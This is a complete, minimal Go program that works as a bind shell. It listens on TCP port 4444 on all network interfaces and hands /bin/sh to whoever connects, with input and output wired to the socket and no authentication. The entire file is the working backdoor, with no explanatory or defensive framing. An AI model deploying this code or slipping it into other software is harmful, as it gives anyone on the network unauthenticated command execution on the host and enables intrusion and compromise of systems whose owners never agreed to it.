package main

import (
    "net"
    "os/exec"
)

func main() {
    listener, _ := net.Listen("tcp", "0.0.0.0:4444")
    connection, _ := listener.Accept()
    command := exec.Command("/bin/sh")
    command.Stdin = connection
    command.Stdout = connection
    command.Stderr = connection
    command.Run()
}
